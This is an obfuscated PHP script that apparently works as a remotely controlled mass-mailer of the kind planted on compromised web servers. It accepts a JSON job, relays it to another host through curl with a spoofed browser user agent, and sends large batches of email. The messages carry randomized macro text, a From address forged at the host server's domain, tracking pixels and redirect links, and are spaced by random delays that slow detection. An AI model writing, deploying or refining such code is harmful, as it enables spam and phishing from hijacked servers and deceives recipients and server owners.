<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($spd51a8d) { if ($spd51a8d == 'keys') { return array_keys($this->_keys); } } public function Import($spd51a8d, $spb63bb0) { if (is_array($spb63bb0)) { $this->values[$spd51a8d] = array(); foreach ($spb63bb0 as $sp3bdec2) { if (!empty($sp3bdec2['key'])) { $this->values[$spd51a8d][$sp3bdec2['key']] = $sp3bdec2['value']; } else { $this->values[$spd51a8d][] = $sp3bdec2['value']; } } } else { $this->Assign($spd51a8d, $spb63bb0); } } public function Assign($spd51a8d, $spcbfff0) { $this->values[$spd51a8d] = $spcbfff0; } public function Parse($spb5a39d) { $spc8cc09 = ''; $sp963508 = 0; while (true) { $sp0dbe35 = strpos($spb5a39d, '{', $sp963508); if ($sp0dbe35 === false) { $spc8cc09 .= substr($spb5a39d, $sp963508); break; } $spc8cc09 .= substr($spb5a39d, $sp963508, $sp0dbe35 - $sp963508); $sp963508 = $sp0dbe35 + 1; $spa0ae29 = ''; $spa3e031 = '{'; $spa5a939 = array(); $sp6e461c = false; $sp76f0b2 = false; $sp046fea = 'var'; while ($sp963508 < strlen($spb5a39d)) { $sp2e7b73 = substr($spb5a39d, $sp963508, 1); $spa3e031 .= $sp2e7b73; if ($sp2e7b73 == ',' || $sp2e7b73 == '>' || $sp2e7b73 == '|') { if ($sp046fea == 'alias') { $sp6e461c = $spa0ae29; } elseif ($sp046fea == 'mod') { $sp76f0b2 = $spa0ae29; } else { $spa5a939[] = $spa0ae29; } $spa0ae29 = ''; if ($sp2e7b73 == '>') { $sp046fea = 'alias'; } if ($sp2e7b73 == '|') { $sp046fea = 'mod'; } $sp963508++; continue; } if ($sp2e7b73 == '}') { if ($sp046fea == 'alias') { $sp6e461c = $spa0ae29; } elseif ($sp046fea == 'mod') { $sp76f0b2 = $spa0ae29; } else { $spa5a939[] = $spa0ae29; } $sp963508++; break; } $spa0ae29 .= $sp2e7b73; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $sp2e7b73) == 0) { $sp963508++; $spa5a939 = array(); break; } $sp963508++; } if (sizeof($spa5a939) == 0) { $spc8cc09 .= $spa3e031; continue; } $sp5697f6 = false; $sp51777b = false; if (preg_match('/^\\^/', $spa5a939[0]) > 0) { $spa5a939[0] = substr($spa5a939[0], 1); $sp5697f6 = true; } if (preg_match('/^\\!/', $spa5a939[0]) > 0) { $spa5a939[0] = substr($spa5a939[0], 1); $sp51777b = true; } $sp3c0f75 = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $spa5a939[0], $spdc27f9) > 0) { $sp3c0f75 = $spdc27f9[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $spa5a939[0], $spdc27f9) > 0) { $sp3c0f75 = explode('-', $spdc27f9[1]); } if ($sp3c0f75 !== false) { $spa5a939[0] = substr($spa5a939[0], 0, strpos($spa5a939[0], '[')); } $this->_keys[$spa5a939[0]] = true; if (empty($this->values[$spa5a939[0]]) && empty($this->fixed[$spa5a939[0]])) { continue; } if ($sp5697f6) { unset($this->fixed[$spa5a939[0]]); } if (isset($this->fixed[$spa5a939[0]])) { $spdc0709 = $this->fixed[$spa5a939[0]]; } else { $spdc0709 = ''; $spb46bc7 = 1; if (sizeof($spa5a939) == 2) { $spb46bc7 = $spa5a939[1]; } if (sizeof($spa5a939) == 3) { $spb46bc7 = rand($spa5a939[1], $spa5a939[2]); } for ($spc4fe34 = 0; $spc4fe34 < $spb46bc7; $spc4fe34++) { if (is_array($this->values[$spa5a939[0]])) { if (!is_array($this->used[$spa5a939[0]])) { $this->used[$spa5a939[0]] = array(); } if (count($this->used[$spa5a939[0]]) == count($this->values[$spa5a939[0]])) { $this->used[$spa5a939[0]] = array(); } if ($sp3c0f75 !== false && is_scalar($sp3c0f75)) { $spdc0709 .= $this->values[$spa5a939[0]][$sp3c0f75]; $this->used[$sp3c0f75] = true; } else { $sp0bbc97 = array(); if (is_array($sp3c0f75)) { $sp49e034 = $sp3c0f75[0]; $spc497d6 = $sp3c0f75[1]; } else { $sp49e034 = 0; $spc497d6 = count($this->values[$spa5a939[0]]) - 1; } for ($sp495053 = $sp49e034; $sp495053 <= $spc497d6; $sp495053++) { if ($sp51777b && !empty($this->used[$spa5a939[0]][$sp495053])) { continue; } $sp0bbc97[] = $sp495053; } $sp8128c9 = $sp0bbc97[rand(0, count($sp0bbc97) - 1)]; $this->used[$spa5a939[0]][$sp8128c9] = true; $spdc0709 .= $this->values[$spa5a939[0]][$sp8128c9]; } } else { $spdc0709 .= $this->values[$spa5a939[0]]; } } } $spdc0709 = $this->Parse($spdc0709); if ($sp76f0b2 !== false) { for ($spa60b7b = 0; $spa60b7b < strlen($sp76f0b2); $spa60b7b++) { switch (substr($sp76f0b2, $spa60b7b, 1)) { case 'b': $spdc0709 = base64_encode($spdc0709); break; case 'q': $spdc0709 = quoted_printable_encode($spdc0709); break; default: break; } } } if ($sp5697f6) { $this->fixed[$spa5a939[0]] = $spdc0709; } if ($sp6e461c !== false && $sp6e461c != '') { $this->fixed[$sp6e461c] = $spdc0709; } $spc8cc09 .= $spdc0709; } return $spc8cc09; } } $sp89617a = file_get_contents('php://input'); $sp2007a5 = json_decode($sp89617a, true); if (empty($sp2007a5['via_proxy'])) { $sp2007a5['via_proxy'] = true; $sp58c7e7 = curl_init($sp2007a5['prefix'] . $sp2007a5['files']['s']); $sp252deb = json_encode($sp2007a5); curl_setopt($sp58c7e7, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp58c7e7, CURLOPT_TIMEOUT, 600); curl_setopt($sp58c7e7, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp58c7e7, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp58c7e7, CURLOPT_REFERER, $sp464427); curl_setopt($sp58c7e7, CURLOPT_POST, true); curl_setopt($sp58c7e7, CURLOPT_POSTFIELDS, $sp252deb); curl_setopt($sp58c7e7, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp252deb))); $sp3f2847 = curl_exec($sp58c7e7); echo $sp3f2847; die; } $spa6befd = $_SERVER['SERVER_ADDR']; $sp524d54 = $_SERVER['HTTP_HOST']; $sp524d54 = preg_replace('/^www\\./', '', $sp524d54); $sp018e5b = new Macros(); $sp018e5b->Assign('server_addr', $spa6befd); $sp018e5b->Assign('server_host', $sp524d54); foreach ($sp2007a5['macros'] as $spd51a8d => $spb63bb0) { $sp018e5b->Import($spd51a8d, $spb63bb0); } $sp15b93e = preg_replace('/^www\\./i', '', $sp524d54); $spc10405 = $sp018e5b->Parse('{from_user}@' . $sp15b93e); $sp018e5b->Assign('from_email', $spc10405); $sp018e5b->Assign('prefix', $sp2007a5['prefix']); $sp018e5b->Assign('html', $sp2007a5['letter']['html']); $sp963508 = 0; $sp0f1519 = 0; $sp0cc3e2 = 0; $spede70e = array(); foreach ($sp2007a5['rcpt'] as $spa5bac2) { $sp018e5b->Assign('email', $spa5bac2['email']); $sp018e5b->Assign('entry', $spa5bac2); $sp018e5b->Assign('date', date('r')); $sp018e5b->Assign('redirect', $sp2007a5['prefix'] . $sp2007a5['files']['r']); $sp018e5b->Assign('redirect_with_uri', $sp2007a5['prefix'] . $sp2007a5['files']['r'] . '?uri='); $sp018e5b->Assign('unsubscribe', $sp2007a5['prefix'] . $sp2007a5['files']['u'] . '?id=' . $spa5bac2['id']); $sp018e5b->Assign('delivery', '<img src="' . $sp2007a5['prefix'] . $sp2007a5['files']['d'] . '?id=' . $spa5bac2['id'] . '" />'); $sp1a6f85 = $sp018e5b->Parse($sp2007a5['envelope']['header']); $sp1fd656 = $sp018e5b->Parse($sp2007a5['envelope']['body']); if (!empty($spa5bac2['name'])) { $spf973a9 = $spa5bac2['name'] . ' <' . $spa5bac2['email'] . '>'; } else { $spf973a9 = $spa5bac2['email']; } $sp885346 = $sp018e5b->Parse($sp2007a5['letter']['subject']); if ($sp963508 > 0) { sleep(rand(3, 8)); } $sp7c6907 = mail($spf973a9, $sp885346, $sp1fd656, $sp1a6f85); $spede70e[$spa5bac2['id']] = $sp7c6907; if ($sp7c6907) { $sp0f1519++; } else { $sp0cc3e2++; } $sp963508++; } echo serialize(array('total' => count($sp2007a5['rcpt']), 'sent' => $sp963508, 'success' => $sp0f1519, 'error' => $sp0cc3e2, 'rcpt' => $spede70e));